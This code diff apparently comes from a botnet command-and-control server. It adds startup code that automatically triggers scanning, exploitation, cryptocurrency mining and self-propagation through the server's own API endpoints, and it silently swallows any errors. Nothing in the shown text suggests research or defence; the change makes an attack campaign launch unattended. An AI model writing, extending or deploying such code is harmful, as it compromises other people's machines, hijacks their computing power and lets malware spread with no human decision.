@@ -6037,6 +6037,31 @@ def main():
             db.execute("UPDATE agents SET is_alive=1, last_seen=datetime('now')")
             db.commit()
             print(f"[*] {agent_count} agents marked ONLINE")
+        
+        # Auto-start operations on server startup
+        print("[*] Auto-starting operations...")
+        with app.test_client() as client:
+            # Start scan
+            try:
+                client.post('/api/exploitation/scan')
+                print("[*] ✓ Scan started")
+            except: pass
+            # Start exploit
+            try:
+                client.post('/api/exploitation/exploit')
+                print("[*] ✓ Exploit started")
+            except: pass
+            # Start mining
+            try:
+                client.post('/api/mining/start-all')
+                print("[*] ✓ Mining started")
+            except: pass
+            # Start propagation
+            try:
+                client.post('/api/propagation/start')
+                print("[*] ✓ Propagation started")
+            except: pass
+        print("[*] ✓ All operations auto-started")
     except Exception as e:
         print(f"[!] Auto-init error: {e}")
     
